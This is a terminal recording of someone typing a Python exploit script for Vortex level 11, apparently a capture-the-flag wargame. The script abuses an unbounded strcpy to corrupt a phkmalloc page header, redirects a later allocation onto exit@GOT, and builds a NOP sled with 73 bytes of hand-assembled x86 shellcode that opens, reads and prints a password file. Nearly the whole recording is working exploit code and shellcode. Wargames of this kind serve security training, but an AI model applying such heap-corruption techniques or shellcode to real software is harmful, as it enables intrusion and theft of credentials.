[221.628373, "o", "\u001b[?25l\u001b[24;1H\u001b[K\u001b[24;1H:set paste noai nosi nocindent\r\u001b[1;1H\u001b[?25h\u001b[?25l\u001b[24;70Hi\u001b[1;1H\u001b[24;70H \u001b[1;1H\u001b[24;1H\u001b[1m-- INSERT (paste) --\u001b[m\u001b[24;22H\u001b[K\u001b[1;1H\u001b[?25h\u001b[?25l\u001b[34m#!/usr/bin/env python3\u001b[m\u001b[2;1H\u001b[K\u001b[2;1H\u001b[?25h\u001b[?25l\u001b[34m# Build the L11 craft payload (argv[1]) and the EGG sled (shellcode).\u001b[m\u001b[3;1H\u001b[K\u001b[3;1H\u001b[?25h\u001b[?25l\u001b[34m#\u001b[m\u001b[4;1H\u001b[K\u001b[4;1H\u001b[?25h\u001b[?25l\u001b[34m# Heap layout (gdb-verified):\u001b[m\u001b[5;1H\u001b[K\u001b[5;1H\u001b[?25h\u001b[?25l\u001b[34m#   a = malloc(0x800) -> 0x804f000\u001b[m\u001b[6;1H\u001b[K\u001b[6;1H\u001b[?25h\u001b[?25l\u001b[34m#   b = malloc(0x10)  -> 0x8050030\u001b[m\u001b[7;1H\u001b[K\u001b[7;1H\u001b[?25h\u001b[?25l\u001b[34m#   c = malloc(0x800) -> 0x804f800   <-- argv[1] lands here\u001b[m\u001b[8;1H\u001b[K\u001b[8;1H\u001b[?25h\u001b[?25l\u001b[34m#   d = malloc(0x10)  -> 0x8050040\u001b[m\u001b[9;1H\u001b[K\u001b[9;1H\u001b[?25h\u001b[?25l\u001b[34m#\u001b[m\u001b[10;1H\u001b[K\u001b[10;1H\u001b[?25h\u001b[?25l\u001b[34m# c spans 0x804f800..0x8050000 (2048 bytes); byte 2048 is the page\u001b[m\u001b[11;1H\u001b[K\u001b[11;1H\u001b[?25h\u001b[?25l\u001b[34m# header of the NEXT phkmalloc page (0x8050000): prev/next/info/bitmap.\u001b[m\u001b[12;1H\u001b[K\u001b[12;1H\u001b[?25h\u001b[?25l\u001b[34m#\u001b[m\u001b[13;1H\u001b[K\u001b[13;1H\u001b[?25h\u001b[?25l\u001b[34m# The overflow: strcpy(c, argv[1]) has no bound, so 2048 filler bytes\u001b[m\u001b[14;1H\u001b[K\u001b[14;1H\u001b[?25h\u001b[?25l\u001b[34m# reach the page header and 9 more craft bytes overwrite it:\u001b[m\u001b[15;1H\u001b[K\u001b[15;1H\u001b[?25h\u001b[?25l\u001b[34m#   prev  = 0x11111111 (junk)\u001b[m\u001b[16;1H\u001b[K\u001b[16;1H\u001b[?25h\u001b[?25l\u001b[34m#   next  = 0x0804cfdc (points INTO the old a-chunk region)\u001b[m\u001b[17;1H\u001b[K\u001b[17;1H\u001b[?25h\u001b[?25l\u001b[34m#   info  = 0x11       (byte; copy stops at the NUL right after)\u001b[m\u001b[18;1H\u001b[K\u001b[18;1H\u001b[?25h\u001b[?25l\u001b[34m#\u001b[m\u001b[19;1H\u001b[K\u001b[19;1H\u001b[?25h\u001b[?25l\u001b[34m# Then d = malloc(0x10) walks the corrupt list: it lands on a fake\u001b[m\u001b[20;1H\u001b[K\u001b[20;1H\u001b[?25h\u001b[?25l\u001b[34m# chunk whose bit_index shift gives base+64 == 0x804d01c == exit@GOT.\u001b[m\u001b[21;1H\u001b[K\u001b[21;1H\u001b[?25h\u001b[?25l\u001b[34m# strncpy(d, argv[2], 15) then writes 15 bytes over exit@GOT.\u001b[m\u001b[22;1H\u001b[K\u001b[22;1H\u001b[?25h\u001b[?25l\u001b[35mimport\u001b[m sys, struct\u001b[23;1H\u001b[K\u001b[23;1H\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[23;1H\r\r\n\u001b[1;24r\u001b[23;1H\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1H\u001b[34m# the password shellcode: NUL-free, 73 bytes, int 0x80 open/read/write\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1H\u001b[34m#   build \"/etc/vortex_pass/vortex1\" on the stack (7 dwords), then\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1H\u001b[34m#   mov byte [ebx+24],'2'  -> \"/etc/vortex_pass/vortex12\", then\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1H\u001b[34m#   open(eax=5)/read(eax=3)/write(eax=4)/exit(eax=1) via int 0x80\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1HSC = \u001b[36mbytes\u001b[m.fromhex(\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;5H\u001b[31m'31c050'\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;5H\u001b[31m'6874657831'\u001b[m  \u001b[34m# push 0x31786574  'tex1'\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;5H\u001b[31m'682f766f72'\u001b[m  \u001b[34m# push 0x726f762f  'vor/'\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;5H\u001b[31m'6870617373'\u001b[m  \u001b[34m# push 0x73736170  'pass'\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;5H\u001b[31m'687465785f'\u001b[m  \u001b[34m# push 0x5f786574  'tex_'\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;5H\u001b[31m'682f766f72'\u001b[m  \u001b[34m# push 0x726f762f  'vor/'\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;5H\u001b[31m'682f657463'\u001b[m  \u001b[34m# push 0x6374652f  '/etc'\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;5H\u001b[31m'89e3'\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;5H\u001b[31m'c6431832'\u001b[m    \u001b[34m# mov byte [ebx+24], 0x32   '1'->'2'\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;5H\u001b[31m'31c9'\u001b[m  \u001b[31m'b005'\u001b[m  \u001b[31m'cd80'\u001b[m   \u001b[34m# open(path, 0)\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;5H\u001b[31m'89c3'\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;5H\u001b[31m'b003'\u001b[m  \u001b[31m'89e1'\u001b[m  \u001b[31m'31d2'\u001b[m  \u001b[31m'b264'\u001b[m  \u001b[31m'cd80'\u001b[m   \u001b[34m# read(fd, path, 100)\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;5H\u001b[31m'89c2'\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;5H\u001b[31m'b004'\u001b[m  \u001b[31m'b301'\u001b[m  \u001b[31m'89e1'\u001b[m  \u001b[31m'cd80'\u001b[m   \u001b[34m# write(1, buf, n)\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;5H\u001b[31m'b001'\u001b[m  \u001b[31m'31db'\u001b[m  \u001b[31m'cd80'\u001b[m)  \u001b[34m# exit(0)\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1H\u001b[33massert\u001b[m \u001b[36mlen\u001b[m(SC) == \u001b[31m73\u001b[m \u001b[33mand\u001b[m \u001b[31mb'\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m'\u001b[m \u001b[33mnot\u001b[m \u001b[33"]
[221.628916, "o", "min\u001b[m SC\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[23;1H\r\r\n\u001b[1;24r\u001b[23;1H\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1H\u001b[34m# craft: 2048 filler + prev(4) + next(4) + info byte\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1Hcraft = \u001b[31mb'A'\u001b[m*\u001b[31m2048\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1Hcraft += struct.pack(\u001b[31m'<I'\u001b[m, \u001b[31m0x11111111\u001b[m)\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1Hcraft += struct.pack(\u001b[31m'<I'\u001b[m, \u001b[31m0x0804cfdc\u001b[m)\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1Hcraft += \u001b[31mb'\u001b[m\u001b[35m\\x11\u001b[m\u001b[31m'\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1H\u001b[33massert\u001b[m \u001b[36mlen\u001b[m(craft) == \u001b[31m2057\u001b[m \u001b[33mand\u001b[m \u001b[31mb'\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m'\u001b[m \u001b[33mnot\u001b[m \u001b[33min\u001b[m craft\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[23;1H\r\r\n\u001b[1;24r\u001b[23;1H\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1H\u001b[34m# egg: big NOP sled so the exact shellcode address needs no precision\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[m\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1Hegg  = \u001b[31mb'\u001b[m\u001b[35m\\x90\u001b[m\u001b[31m'\u001b[m*\u001b[31m1500\u001b[m + SC\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[23;1H\r\r\n\u001b[1;24r\u001b[23;1H\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1H\u001b[36mopen\u001b[m(\u001b[31m'craft.bin'\u001b[m,\u001b[31m'wb'\u001b[m).write(craft)\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1H\u001b[36mopen\u001b[m(\u001b[31m'egg.bin'\u001b[m,\u001b[31m'wb'\u001b[m).write(egg)\r\r\n\u001b[?25h\u001b[?25l\u001b[1;23r\u001b[23;1H\r\r\n\u001b[1;24r\u001b[22;1H\u001b[36mprint\u001b[m(\u001b[31m'craft'\u001b[m, \u001b[36mlen\u001b[m(craft), \u001b[31m'egg'\u001b[m, \u001b[36mlen\u001b[m(egg))\r\r\n\u001b[?25h"]
